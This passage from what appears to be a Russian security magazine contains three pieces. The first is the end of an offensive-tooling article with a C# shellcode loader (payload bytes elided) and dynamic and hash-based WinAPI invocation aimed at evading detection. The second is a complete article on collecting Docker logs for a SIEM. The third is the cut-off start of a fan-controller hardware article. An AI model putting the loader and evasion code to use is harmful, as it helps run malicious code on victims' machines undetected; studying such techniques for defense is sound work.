      byte[] x64shellcode = new byte[294] {0xfc,0x48, ... };


    IntPtr funcAddr = VirtualAlloc(
        IntPtr.Zero,
        (uint)x64shellcode.Length,
        (uint)StateEnum.MEM_COMMIT,
        (uint)Protection.PAGE_EXECUTE_READWRITE);
      Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.
Length);


      IntPtr hThread = IntPtr.Zero;
      uint threadId = 0;
      IntPtr pinfo = IntPtr.Zero;


      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
      WaitForSingleObject(hThread, 0xFFFFFFFF);
      return;
    }


    public static object DynamicPInvokeBuilder(Type type, string
library, string method, Object[] args, Type[] paramTypes)
    {
      AssemblyName assemblyName = new AssemblyName("Temp01");
      AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.
DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
      ModuleBuilder moduleBuilder = assemblyBuilder.
DefineDynamicModule("Temp02");


      MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod
(method, library, MethodAttributes.Public | MethodAttributes.Static |
MethodAttributes.PinvokeImpl, CallingConventions.Standard, type,
paramTypes, CallingConvention.Winapi, CharSet.Ansi);


      methodBuilder.SetImplementationFlags(methodBuilder.
GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
      moduleBuilder.CreateGlobalFunctions();


      MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
      object res = dynamicMethod.Invoke(null, args);
      return res;
    }


    public static IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize
, UInt32 flAllocationType, UInt32 flProtect)
    {
      Type[] paramTypes = { typeof(IntPtr), typeof(UInt32), typeof(
UInt32), typeof(UInt32) };
      Object[] args = { lpAddress, dwSize, flAllocationType,
flProtect };
      object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.
dll", "VirtualAlloc", args, paramTypes);
      return (IntPtr)res;
    }


    public static IntPtr CreateThread(UInt32 lpThreadAttributes,
UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32
dwCreationFlags, ref UInt32 lpThreadId)
    {
      Type[] paramTypes = { typeof(UInt32), typeof(UInt32), typeof(
IntPtr), typeof(IntPtr), typeof(UInt32), typeof(UInt32).MakeByRefType
() };
      Object[] args = { lpThreadAttributes, dwStackSize,
lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
      object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.
dll", "CreateThread", args, paramTypes);
      return (IntPtr)res;
    }


    public static Int32 WaitForSingleObject(IntPtr Handle, UInt32
Wait)
    {
      Type[] paramTypes = { typeof(IntPtr), typeof(UInt32) };
      Object[] args = { Handle, Wait };
      object res = DynamicPInvokeBuilder(typeof(Int32), "Kernel32.
dll", "WaitForSingleObject", args, paramTypes);
      return (Int32)res;
    }


    public enum StateEnum
    {
      MEM_COMMIT = 0x1000,
      MEM_RESERVE = 0x2000,
      MEM_FREE = 0x10000
    }


    public enum Protection
    {
      PAGE_READONLY = 0x02,
      PAGE_READWRITE = 0x04,
      PAGE_EXECUTE = 0x10,
      PAGE_EXECUTE_READ = 0x20,
      PAGE_EXECUTE_READWRITE = 0x40,
    }
  }
}

То есть как и в случае с обычной сигнатурой Platform Invoke указываем имя
функции (можно поменять), возвращаемые значения, принимаемые типы
аргументов. При передаче потока управления этой функции произойдет
динамическое создание необходимой сигнатуры и вызов метода.
  Еще один PoC можно найти в репозитории bohops. Тем не менее Dynamic
PInvoke можно обнаружить через .NET Introspection, ведь в подобной реали‐
зации для каждой функции из неуправляемого кода создается новая сборка,
что можно считать аномальным поведением. Это особенно заметно, когда
названия сборок одинаковые или состоят из случайных символов.





                  .NET Introspection в Process Hacker 2


HASH INVOKE

Наконец, последний метод. Он чем‑то похож на Parasite Invoke. Просто
нацелен  на  меньшее  число  сборок. Я бы даже  сказал,  что  только
на mscorlib. В этой реализации идет перебор имен всех доступных методов
и типов из mscorlib с применением к ним функции хеширования. Для вызова
метода достаточно обратиться к нему по хешу. Эдакий API Hashing, но в кон‐
тексте сборок C#.
   Например, из класса Microsoft.Win32.Win32Native можно обращаться
к стандартным методам GetModuleHandle() или GetProcAddress().


var module =
  HInvoke.InvokeMethod<IntPtr>(13239936, 811580934,
    new object[] {"kernel32.dll"}); // Microsoft.Win32.Win32Native.
GetModuleHandle
var address =
  HInvoke.InvokeMethod<IntPtr>(13239936, 1721745356,
    new object[] {module, "IsDebuggerPresent"}); // Microsoft.Win32.
Win32Native.GetProcAddress
if (((delegate* unmanaged[Stdcall]<bool>) address)())
  Console.WriteLine("Hey meanie I said no debugging :c");

Внутри функции идет уже знакомая тебе по Parasite Invoke подготовка всех
параметров, после чего происходит обращение к methodInfo.Invoke().





                         PoC в деле

К слову, с исходным кодом можно ознакомиться в репозитории dr4k0nia.
Кстати, существуют даже полноценные лоадеры, которые используют этот
механизм. Например, NixImports.


ВЫВОДЫ

Теперь перед нами не устоит ни одна WinAPI-функция! Мы сможем вызвать
любую, невзирая на возможные ограничения платформы .NET. Эта статья —
очередная демонстрация того, что при написании инструментов наступатель‐
ной безопасности следует очень много искать, строить гипотезы и творить,
творить и еще раз творить. «Шаманить над рецептом», — сказал бы я, будь
у нас кулинарный блог.
АДМИН





                                                               Алексей Жоров                      AK_83
     В профессии с 2006 года. Квалификация: канд. техн.
                        наук, CISM, CISSP
                      tester-ak@yandex.ru

Практически все современные системы используют контей‐
неризацию. В большинстве случаев в качестве платформы
контейнеризации служит Docker. Для обеспечения информа‐
ционной безопасности  постепенно  появляются решения
класса Container  Security, но у команд разработки (dev)
или сопровождения (ops) не всегда есть возможность их
ждать, тестировать и встраивать. А командам информацион‐
ной безопасности (sec) заниматься защитой нужно уже сей‐
час.


В такой ситуации можно начать с мониторинга информационной безопас‐
ности происходящего в контейнерах, а для этого понадобится собирать
события безопасности, то есть, проще говоря, логи. И здесь нас ждет ряд
побочных  эффектов,  возникающих  из‑за  эфемерной  сути  контейнеров
Docker. В этой статье поговорим как раз об этих проблемах и вариантах их
решения.


ЛОГИРОВАНИЕ В DOCKER

Уровни ведения журналов
Сначала нужно понять, как в Docker реализовано журналирование событий.
Существует два уровня ведения журналов:
 • журналы демона Docker;
 • журналы контейнерных приложений.

Демон Docker записывает свои журналы в /var/log/syslog (в дистрибутивах
на основе Debian) или /var/log/messages (в дистрах, совместимых с Red
Hat).
  В журналах демона можно  найти информацию о  функционировании
Docker на уровне платформы контейнеризации, включая события жизненного
цикла контейнера, настройки сети, входящие API-запросы и многое другое.
   Сюда же входят и все журналы, которые относятся к конкретному контей‐
нерному приложению. По умолчанию при ведении журнала в формате JSON
путь к журналам контейнера будет следующим:


/var/lib/docker/containers/<container_id>/<container_id>-json.log

При создании нового контейнера ему присваивается уникальный ID. На хосте,
в каталоге /var/lib/docker/containers, создается директория с тем же ID
в качестве названия, а внутри — сам файл журнала, название которого тоже
состоит из префикса json и ID контейнера. При удалении контейнера файл
журнала удаляется вместе с ним.
   Эти  особенности  выливаются  в  настоящие  проблемы  для  команд
информационной безопасности, поскольку мешают собирать события. Ведь
каждый контейнер по умолчанию записывает события в свой отдельный жур‐
нал, журналов получается много, а путь к журналу конкретного контейнера
зависит от его ID, который присваивается при создании контейнера и сбра‐
сывается при удалении контейнера, то есть путь к журналу может быть раз‐
ным.
   Помимо ведения журнала в формате JSON, Docker поддерживает и другие
методы мониторинга. За каждый из методов отвечает драйвер ведения жур‐
нала. Давай посмотрим, какими они бывают.


Драйверы ведения журналов
Драйверы журналов определяют, как журналы собираются, обрабатываются
и хранятся для каждого контейнера.
   Контейнер отправляет события на стандартный поток вывода STDOUT
и поток ошибок STDERR. Далее драйвер ведения журнала считывает эти
события, обрабатывает их и, например, если это драйвер json-file, сохраняет
их файл локально на хосте. Если же используется другой драйвер, например
Syslog, данные отправляются в указанную точку назначения по протоколу
TCP/UDP. Схема с примерами информационных потоков — ниже.





Драйвер ведения журнала и его параметры можно определить как на уровне
демона Docker в конфиге daemon.json (параметры будут распространяться
на все вновь созданные контейнеры), так и на уровне конкретного контейнера
при его запуске, использовав docker run или утилиту docker compose.


Режимы доставки журналов
Режим доставки журналов в Docker определяет, как журналы передаются
из работающих контейнеров в драйвер. Существует два режима такой дос‐
тавки: блокирующий и неблокирующий.
  В блокирующем режиме приложение отправляет события непосредствен‐
но драйверу и может прерывать работу приложения, если доставка не завер‐
шена. Другими словами, если драйвер не может справиться с объемом
записываемых событий, то демон блокирует отправку событий из контейнера,
что может вызвать задержки в работе самого приложения. Но этот режим
гарантирует отправку всех событий без потерь.
   Блокирующий режим включен по умолчанию для драйверов, которые
записывают события непосредственно в журнал на локальном хосте. Нап‐
ример, json-file и journald.
  В неблокирующем режиме события сначала записываются в кольцевой
буфер в памяти, из которого драйвер уже считывает события. Размер буфера
фиксированный. Если драйвер недоступен, Docker не будет приостанав‐
ливать работу приложения и продолжит наполнение буфера. Но если буфер
журнала будет переполнен, это приведет к потере событий. Чтобы этого
избежать, можно увеличить максимальный размер буфера с одного мегабай‐
та (по умолчанию) до более подходящего размера с помощью параметра
max-buffer-size.
   Неблокирующий режим используется, когда драйвер должен установить
соединение с удаленным сервером для отправки событий (например, Syslog,
Fluentd и тому подобные решения).
   Режимы доставки можно определить как на уровне демона Docker, так и на
уровне конкретного контейнера.
   Разобравшись с основами журналирования в Docker, давай подробнее
разберем проблематику сбора событий.


ПРОБЛЕМАТИКА

Сбор событий со всех контейнеров
Если стоит задача собрать события со всех контейнеров Docker, то в случае
с умолчательным драйвером json-file это можно сделать средствами Rsyslog.
Это  стандартный  метод  пересылать  события  в  системы  класса  Log
management или Security information and event management (LM/SIEM).
   Пример файла с настройками:


module(
  load="imfile" PollingInterval="10")
  input(type="imfile" File="/var/lib/docker/containers/*/*-json.log"
  Tag="docker"
  Severity="Info"
  Facility="local7")
local7.* @<ip-адрес коллектора LM/SIEM-системы>:<порт>

С помощью маски */*-json.log можно указать путь к журналам всех контей‐
неров, развернутых на  хосте. Но в  итоге на стороне LM/SIEM-системы
получим общий поток событий, в котором не сможем отличить, с какого кон‐
тейнера получено то или иное событие. А для локализации ИБ‑инцидента
это крайне важно, особенно если контейнеров несколько десятков или даже
сотен.
   Ниже — примеры двух событий, полученных из разных контейнеров, но,
с каких именно контейнеров они пришли, определить сложно:


<190>Apr  5 09:25:01 srv-01 docker {
  "log":"2024-04-05 06:25:01.123 UTC [72]FATAL:  password
authentication failed for user "admin"\r\n",
  "stream":"stdout",
  "time":"2024-04-05T06:25:01.124670483Z"
}


<190>Apr  5 09:32:53 srv-01 docker {
  "log":"::ffff:10.10.10.1 - - [05/Apr/2024:06:32:53 +0000] "POST /
authenticate/login HTTP/1.1" 302 199 "http://10.10.10.170:5051/
login?next=%2Fbrowser%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
"\n",
  "stream":"stdout",
  "time":"2024-04-05T06:32:53.985501905Z"
}

Какие тут могут быть варианты решения проблемы?


Решение 1
Мы можем добавить в события дополнительные данные:
 • образ, с которого был развернут контейнер;
 • имя контейнера;
 • ID контейнера.

Для этого необходимо в конфиг демона Docker /etc/docker/daemon.json
добавить шаблон тега, который будет применяться к журналам всех контей‐
неров:


{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3",
    "tag": "{{.ImageName}}/{{.Name}}/{{.ID}}"
  }
}

В итоге события будут обогащены контекстными данными, как указано в при‐
мерах событий ниже:


<190>Apr  5 09:52:25 srv-01 docker {
  "log":"2024-04-05 06:52:25.632 UTC [44] FATAL:  password
authentication failed for user "admin"\r\n",
  "stream":"stdout",
  "attrs": {"tag":"postgres/postgresql/1b1bfdf7ea5d"},
  "time":"2024-04-05T06:52:25.63500247Z"
}


<190>Apr  5 09:48:53 srv-01 docker {
  "log":"::ffff:10.10.10.1 - - [05/Apr/2024:06:48:53 +0000] "POST /
authenticate/login HTTP/1.1" 302 199 "http://10.10.10.170:5051/login
" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"\n",
  "stream":"stdout",
  "attrs":{"tag":"dpage/pgadmin4/pgadmin/8270d2eec30b"},
  "time":"2024-04-05T06:48:53.504262326Z"
}

Но здесь сразу стоит отметить, что такой вариант подразумевает внесение
изменений в конфигурацию Docker, а это потребует перезапускать демон
и заново создавать контейнеры, поскольку на уже запущенные контейнеры
эта настройка распространяться не будет. Дадут ли это сделать команды соп‐
ровождения (ops), большой вопрос.
  Еще можно переопределить шаблон тега для конкретного контейнера
при его запуске командой docker run или средствами docker compose.
Примеры переопределения приведены ниже.


docker run \
-itd \
-e POSTGRES_USER=<username> \
-e POSTGRES_PASSWORD=<password>\
-p 5432:5432 \
-v /data:/var/lib/postgresql/data \
--name postgresql \
--log-driver json-file \
    --log-opt max-size= 10m \
    --log-opt max-file= 3 \
    --log-opt tag="{{.Name}}/{{.ID}}" \
postgres


docker-compose.yml
version: '3.9'
services:
  postgres:
     container_name: postgresql
     image: postgres
     environment:
          POSTGRES_USER: ${POSTGRES_USER:-<username>}
          POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:- <password>}
          PGDATA: "/var/lib/postgresql/data/pgdata"
      volumes:
          - data:/var/lib/postgresql/data
       ports:
          - "5432:5432"
       logging:
          driver: json-file
          options:
              max-size: 10m
              max-file: "3"
              tag: "{{.Name}}/{{.ID}}"

В этом случае потребуется только пересоздание контейнеров с новыми
параметрами, что тоже на практике, к сожалению, не всегда возможно.


Решение 2
В качестве альтернативного варианта можно настроить Docker так, чтобы
журналы контейнеров записывались в формате Syslog на хост Docker, а далее
средствами Rsyslog отправлять их на коллектор системы LM/SIEM.
  Для этого переопределим драйвер ведения журнала в /etc/docker/
daemon.json на Syslog. В качестве параметров нужно указать системный
сокет для отправки журналов в системный журнал хоста и определить тег
с именем контейнера:


{
 "log-driver": "syslog",
 "log-opts": {
 "syslog-address": "unixgram:///dev/log",
 "tag" : "docker/{{.Name}}"
 }
}

Затем  создаем  конфигурационный  файл  Rsyslog  /etc/rsyslog.d/10-
docker.conf, который будет фильтровать события и записывать их в отдель‐
ные файлы:


$FileCreateMode 0644
$template DockerDaemonLogFileName,"/var/log/docker/docker.log"
$template DockerContainerLogFileName,"/var/log/docker/%SYSLOGTAG:R,
ERE,1,FIELD:docker/(.*)\[--end:secpath-replace%.log"
if $programname == 'dockerd' then {
 ?DockerDaemonLogFileName
 stop
}
 if $programname == 'containerd' then {
 ?DockerDaemonLogFileName
 stop
}
if $programname == 'docker' then {
 if $syslogtag contains 'docker/' then {
 ?DockerContainerLogFileName
 stop
 }
}
$FileCreateMode 0600

После перезапуска службы Rsyslog события демона Docker и каждого контей‐
нера начнут записываться в отдельные файлы в каталог /var/log/docker/.
   Далее  создаем  конфиг  /etc/rsyslog.d/10-siem-docker-logs.conf,
который будет вычитывать эти журналы и пересылать на коллектор системы
LM/SIEM:


module(load="imfile" PollingInterval="10")
input(type="imfile" File="/var/log/docker/*.log"
Severity="info"
Facility="local7")
local7.* @<ip-адрес коллектора LM/SIEM-системы>:<порт>

Ну и последним пунктом необходимо настроить ротацию этих журналов
средствами logrotate в файле /etc/logrotate.d/rsyslog-docker:


/var/log/docker/*.log
{
 daily
 rotate 10
 minsize 200M
 missingok
 notifempty
 compress
 sharedscripts
 postrotate
 /usr/lib/rsyslog/rsyslog-rotate
 endscript
}

Но такой вариант подразумевает внесение изменений в настройки Docker,
что потребует перезапустить демон и создать контейнеры заново.


Сбор событий с одного контейнера
Если стоит задача собирать события с одного конкретного контейнера, то мы
сталкиваемся с проблемой непостоянства пути к файлу журнала.
   Например, при настройке сбора событий из файла необходимо указать
абсолютный путь к log-файлу конкретного контейнера, как в примере ниже:


module(load="imfile" PollingInterval="10")
input(type="imfile" File="/var/lib/docker/containers/
79aac53d21cac323b13f506e295cb13bfa28e8f68b91d2760a5d878879678141/
79aac53d21cac323b13f506e295cb13bfa28e8f68b91d2760a5d878879678141-
json.
log"
Tag="docker/postgresql"
Severity="info"
Facility="local7")
local7.* @<ip-адрес коллектора LM/SIEM-системы>:<порт>

Но во время эксплуатации контейнер может быть удален и запущен с новыми
параметрами. Из‑за этого контейнеру будет присвоен новый ID и изменится
путь к log-файлу. Это требует оперативной перенастройки Rsyslog, иначе
можно потерять события, в том числе относящиеся к безопасности. Давай
рассмотрим варианты решения проблемы.


Решение 1
Мы можем сменить для этого контейнера драйвер ведения журнала на Syslog
и с помощью параметров настроить отправку событий в нужном нам формате
на коллектор системы LM/SIEM.
   Здесь используется метод сбора push (то есть источник событий в лице
контейнерного приложения сам отправляет события в LM/SIEM) и мы не при‐
вязываемся к пути log-файла (то есть не требуется из него вычитывать кол‐
лектором LM/SIEM). Переопределение потребует заново создать контейнер
и добавить новые параметры ведения журнала:


docker run \
   --log-driver syslog \
   --log-opt mode=non-blocking \
   --log-opt max-buffer-size= 20m \
   --log-opt tag="{{.Name}}/{{.ID}}" \
   --log-opt syslog-format=rfc3164 \
   --log-opt syslog-address=udp://<ip-адрес коллектора LM/
SIEM-системы>:<порт> \


docker-compose.yml
logging:
  driver: syslog
  options:
     mode: non-blocking
     max-buffer-size: 20m
     tag: "{{.Name}}/{{.ID}}"
     syslog-format: rfc3164
     syslog-address: "udp://<ip-адрес коллектора LM/SIEM-системы>:<
порт>"

Но снова сталкиваемся с тем, что контейнер иногда создается заново — нап‐
ример, при обновлении или обслуживании приложения.
  А что делать, если нам нужно настроить сбор событий с конкретного кон‐
тейнера прямо сейчас? Или если команды разработки и сопровождения пол‐
ностью устраивает настроенное журналирование с драйвером json-file и они
не хотят ничего менять?
  В этом  случае для  специалистов по информационной безопасности
существует альтернативный вариант, о котором поговорим ниже.


Второй вариант решения для сбора событий с одного контейнера
Этот вариант подразумевает использование Bash-скрипта для отслеживания
изменения пути к файлу и оперативного обновления его в настройках Rsyslog.
Вот пример такого скрипта:


#!/bin/bash
collector_address="10.10.10.10"
collector_port="514"
container_name=postgresql
cont_logpath=$(docker inspect --format='{{.LogPath}}' $container_name
)
command_output=$(cat /etc/rsyslog.d/10-postgresql-siem.conf | grep -o
$cont_logpath)
container_id=$(docker ps -aqf "name=$container_name")
rsyslog_tag="$container_name $container_id"
echo $rsyslog_tag
if [[ "$cont_logpath" == "$command_output"  ]]
then
 echo "LogPath matches"
else
 echo -e "module(load="imfile" PollingInterval=" 10")\ninput(type="
imfile" File="$cont_logpath"\nTag="$rsyslog_tag"\nSeverity=" info"\n
Facility="local7")\nlocal7.* @$collector_address:$collector_port" > /
etc/rsyslog.d/10-postgresql-siem.conf
 systemctl restart rsyslog.service
fi

Скрипт выполняет следующие действия:
 • определяет с помощью команды docker inspect текущий путь к файлу
   журнала контейнера;
 • определяет путь к файлу журнала контейнера, прописанный в указанном
   файле конфигурации Rsyslog;
 • формирует тег Rsyslog из имени контейнера и его сокращенного ID;
 • сравнивает пути и, если они не совпадают, обновляет путь к файлу в кон‐
   фиге Rsyslog;
 • перезапускает службы Rsyslog для применения изменений.

Для кастомизации скрипта тебе потребуется:
 • указать    IP-адрес    и    порт     коллектора    LM/SIEM-системы
    (collector_address);
 • указать имя контейнера (postgresql);
 • указать имя файла конфигурации rsyslog (10-postgresql-siem.conf);
 • указать параметры Syslog для Severity (info) и Facility (local7);
 • сделать скрипт исполняемым;
 • добавить скрипт в crontab и задать выполнение, например, каждую минуту.

В результате работы скрипта всегда будет получаться актуальный файл нас‐
троек Rsyslog (точнее, почти всегда, так как есть небольшая вероятность
попасть на 60-секундный «провал»). Как следствие — практически непрерыв‐
но работающая задача сбора событий, в том числе событий безопасности.


РОТАЦИЯ ЖУРНАЛОВ

Нужно сказать еще пару слов про ротацию логов, так как при использовании
драйвера json-file ротация журналов контейнерных приложений по умолчанию
не происходит. А она важна, чтобы всем в контейнере хватало места и чтобы
мы не создали отказ в обслуживании сами себе. Существуют два варианта
настройки ротации журналов.


Первый вариант ротации
Можем задать параметры ротации журналов как на уровне демона Docker
для всех вновь создаваемых контейнеров, так и при необходимости на уров‐
не конкретного контейнера.


/etc/docker/daemon.json
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
 }
}


docker run --log-driver json-file \
    --log-opt max-size= 10m \
    --log-opt max-file= 3 \


docker-compose.yml
logging:
      driver: "json-file"
      options:
        max-size: 10m
        max-file: "3"


Второй вариант ротации
Средствами  стандартной встроенной  утилиты  logrotate задаем ротацию
для всех контейнеров.


/etc/logrotate.d/docker
/var/lib/docker/containers/* /* .log {
 rotate 7
 daily
 compress
 missingok
 delaycompress
 copytruncate
}


ВЫВОДЫ

Популярность Docker все растет, и он уже стал одним из ведущих решений.
Но к сожалению, возможность работать с ним пока появилась не во всех
решениях для обеспечения безопасности, а мониторинг контейнеров нужен
уже сейчас. Надеюсь, статья поможет тебе покрыть это отставание. А заодно
не поругаться с представителями других команд в компании!
GEEK





У настоящего хакера холодными должны
быть не только сердце или разум, но и
в первую очередь компьютерное железо.
Чтобы избежать его  перегрева, исполь‐
зуются  различные  аппаратные  системы            Candidum                                                                                               duospirit@gmail.com
управления  вентиляторами  охлаждения.
Однако готовые решения либо слишком
дорогие, либо чересчур примитивные. Зна‐
чит,  нужно  собрать  такое  устройство
самостоятельно! Сейчас расскажу как.


В большинстве современных материнских плат присутствует крайне удобная
функция управления вентиляторами охлаждения, позволяющая динамически
менять  обороты  кулеров  в  зависимости  от  температуры  процессора.
Это дает возможность не гонять пыль зазря, когда машина простаивает,
а заодно существенно снизить шум. Настройка этой системы обычно выпол‐
няется в UEFI или с использованием утилит от производителя материнской
платы. А что делать, если подобные варианты недоступны? Придется взяться
за паяльник и добавить необходимую функциональность самостоятельно.


ИЗВЕСТНЫЕ РЕШЕНИЯ

На алике продается множество готовых решений, однако мне ни одно не пон‐
равилось. Так, приобретенная мной китайская плата на поверку оказалась
линейным регулятором напряжения!





                        Контроллер на восемь кулеров

А я все смотрел на нее и думал, зачем там такие мощные полевики стоят.
Ответ прост: они работают в линейном режиме. Нет, железка, конечно, обо‐
роты регулирует, однако при понижении напряжения в какой‑то момент
кулеры останавливаются, и это происходит далеко не в крайнем положении
движка резистора. При этом на транзисторе регулятора мощность продол‐
жает рассеиваться в виде тепла. Мне такое и даром не нужно.
   Справедливости ради надо сказать, что железка эта дешевая и одинаково
работает со всеми типами кулеров на 12 В. Существуют, конечно, штуки
посерьезнее, с дисплеем и множеством настроек, но на мой вкус они дико
избыточны, с одной стороны, и дороги — с другой. Смотрятся они прикольно,
но бестолково.





                    Продвинутый контроллер кулеров

Кроме того, существует немало схем самодельных контроллеров, но перед
тем, как рассмотреть некоторые из них, разберемся сперва с самими вен‐
тиляторами.


АНАТОМИЯ И ФИЗИОЛОГИЯ ВЕНТИЛЯТОРА

Низковольтные вентиляторы используют бесщеточные двигатели постоян‐
ного тока и различаются между собой в основном типом интерфейса. Мелочи
вроде разного напряжения питания вроде 5, 12, 24 В и далее со всеми оста‐
новками оставим за кадром, как очевидные.
   Вентиляторы бывают двухпроводные, трехпроводные и четырехпровод‐
ные. С первыми все просто и понятно: два провода — это питание, подал
на них напряжение —  крутит, отключил — не  крутит. В трехпроводном
интерфейсе к линиям питания добавляется выход тахометра, выдающего
по два импульса на оборот кулера. Этот вывод представляет собой выход
с открытым коллектором, иными словами, ему нужна подтяжка к плюсу
питания для работы.
  В  четырехпроводном  варианте  предусмотрен  дополнительный вывод
для контроля оборотов, которые задаются ШИМ‑сигналом. У выхода есть
внутренняя подтяжка к плюсу, поэтому, если его оставить висеть в воздухе,
обороты будут максимальны. А еще для подачи ШИМ‑сигнала можно исполь‐
зовать выход с открытым коллектором.





                              Распиновка кулеров

Легко видеть, что такая распиновка обеспечивает полную обратную сов‐
местимость, поэтому нет нужды ломать голову, какой кулер подключать
к материнской плате. Работать будет любой, подходящий по напряжению.
Теперь, вооружившись статьей Why and How to Control Fan Speed for Cooling
Electronic Equipment, разберемся, как устроены вентиляторы. Итак, сердцем
бесщеточного мотора вентилятора является датчик Холла, который опре‐
деляет положение магнитного ротора. Когда к датчику приближается север‐
ный полюс магнита, на его выходе образуется логическая единица, с южным
полюсом — наоборот.





                 К пояснению работы датчика Холла

Собственно, сигнал с датчика Холла служит для управления ключами, пита‐
ющими катушки, и типичная упрощенная схема бесщеточного вентилятора
выглядит так.





               Схема бесщеточных вентиляторов 3pin и 4pin

Здесь видно, откуда берется сигнал тахометра и что он собой представляет,
а также как к этому делу приладить ШИМ‑контроль оборотов. Обрати вни‐
мание, что управляемый ШИМ‑сигналом ключ коммутирует только силовую
часть мотора, не нарушая работу датчика Холла и позволяя корректно опре‐
делить число оборотов независимо от уровня сигнала на выводе PWM. Двух‐
проводной вентилятор отличается лишь тем, что наружу не выведен выход
TACHO. А на практике это может выглядеть еще проще — упакованным в одну
микросхему, где будут сразу и датчик, и ключи, и прочая обвязка.





                 Мотор вентилятора на одной микросхеме


             INFO

                      Вот здесь и здесь один веселый чех ковыряет
                          вентилятор  от  компьютерного  блока  питания.
                      У него даже есть видео, неплохо поясняющее
                         принцип работы кулера.



ТАК КАК ЖЕ ИМ РУЛИТЬ?

Существуют четыре классических подхода к управлению оборотами вен‐
тиляторов, их мы и рассмотрим. Сразу скажу, что четвертый — наиболее
предпочтительный.


Вариант первый. Дискретный
Тут все просто. Вентилятор включается, только когда это необходимо, а в
остальное время он выключен. После включения он работает на максималь‐
ных оборотах. Вариант хороший, однако он далеко не всегда применим, так
как во многих случаях активное охлаждение необходимо и на холостом ходу,
поэтому останавливаться тут смысла я не вижу.


Вариант второй. Линейный регулятор
На вентилятор подается питание с линейного регулятора. Иными словами,
когда нужно снизить обороты, на кулер подают меньше штатных 12 В, и ско‐
рость вращения снижается. Так как входное напряжение у нас уже стабиль‐
ное и отфильтрованное, то ставить специализированную микросхему типа
LM317 необязательно, можно обойтись и простым эмиттерным или исто‐
ковым повторителем либо использовать источник тока.





                        Линейный регулятор оборотов

Вариант простой и универсальный, поскольку подходит для любого типа вен‐
тиляторов. Широко используется китайцами. Подобные устройства стоят
около 300 рублей, так что дешевле их купить, чем собирать самому. Упомяну‐
тый выше китайский контроллер работает именно так.
  Но у этого решения есть несколько серьезных минусов. Во‑первых, бес‐
щеточным вентиляторам нужно порядка 5 В для питания датчика Холла, иначе
крутиться он не будет, и такой режим работы для двигателя явно нештатный.
Для «пятивольтовых» кулеров это еще большая проблема, так как у них диапа‐
зон напряжений, при которых сохраняется работоспособность, значительно
уже.
   Во‑вторых, напряжение, при котором двигатель стартует, всегда чуть
выше напряжения, при котором он останавливается. То есть если выставить
низкие обороты, то вентилятор может не запуститься при включении. И третья
неприятность — низкий КПД,  поскольку вся мощность, которая падает
на регуляторе, будет уходить в тепло.


Вариант третий. Медленный ШИМ по питанию
Этот способ лишен большинства недостатков предыдущего и достаточно
часто  используется.  Суть  его  состоит  в  том,  что  двигатель  питается
ШИМ‑сигналом.





                      ШИМ‑регулятор оборотов

Главное — выбрать невысокую частоту ШИМ‑сигнала. Например, в представ‐
ленной схеме частота должна быть около 50 Гц. Схема подойдет для любого
из рассмотренных нами вентиляторов, единственная проблема возникнет
с сигналом тахометра: он будет некорректным. Впрочем, выбор частоты
ШИМ‑сигнала ниже частоты тахометра отчасти решает эту проблему.
  С КПД у данной схемы тоже все в порядке. Если надо регулировать обо‐
роты двух- или трехпроводного кулера, то это лучшее решение. Из минусов
только проблемы с измерением частоты оборотов. Любопытно, что если
установить параллельно двигателю конденсатор на несколько десятков мик‐
рофарад, то схема начнет работать как описанный выше линейный регулятор.


Вариант четвертый, штатный
Как известно, в промышленности сидят далеко не глупые инженеры. Само
собой, они придумали способ регулировки оборотов. Так появились четырех‐
пиновые кулеры. Они позволяют не только штатно менять обороты, но и
отслеживать их изменение,  благодаря чему можно, например, вовремя
выявить неисправность вентилятора. Как это работает? Так же, как и в пре‐
дыдущем  способе,  только  ШИМ‑сигнал  коммутирует  непосредственно
обмотки двигателя, а датчик Холла при этом постоянно получает питание.
   Соответственно,  обороты  измеряются  корректно  в любом  случае.
На интерфейс четырехпиновых кулеров есть несколько спецификаций — пос‐
тарше от Intel и посвежее от Noctua. Выжимка главной сути этих документов
звучит так:
 • вывод TACHO с открытым коллектором для работы нуждается в подтяжке
   к питанию и выдает по два импульса на оборот вала;
 • вход PWM имеет внутреннюю подтяжку к +5 В и может быть подключен
   как к CMOS-выводу (например, GPIO), так и к выходу с открытым коллекто‐
   ром. Спецификация от Noctua строже и не рекомендует использовать
   открытый коллектор, ссылаясь на то, что заваленные передние фронты
   импульсов могут сделать работу вентилятора непредсказуемой. В любом
   случае сигнал на входе PWM не должен превышать +5 В, иначе кулер вый‐
   дет из строя;
 • частота ШИМ‑сигнала должна лежать в интервале от 21 до 27 кГц,
   рекомендованная — 25 кГц;
 • степень заполнения ШИМ‑сигнала от 20 до 100%, ниже 20% поведение
   неопределенное. В большинстве случаев обороты остаются минималь‐
  ными и не регулируются в сторону уменьшения.

На практике я погонял китайский серверный кулер с ГСС в разных режимах
и могу сказать, что PWM одинаково хорошо работает и с открытым коллекто‐
ром, и с полумостовым выходом. Частота ШИМ‑сигнала роли не играет, вен‐
тилятор работает и с 1 кГц, и с 40 кГц, разницы на глаз не видно. Правда,
пишут, что если взять частоту ШИМ в звуковом диапазоне, то кулер может
начать пищать, поэтому указанный в спецификации диапазон выглядит разум‐
но.  На  рисунке  представлена  практическая  схема  ШИМ‑регулятора
на NE555.





                    Схема ШИМ‑регулятора на NE555


           WARNING

                         Обрати   внимание,   что   в   данном   случае
                    NE555 питается от +5 В. Если подать на вход
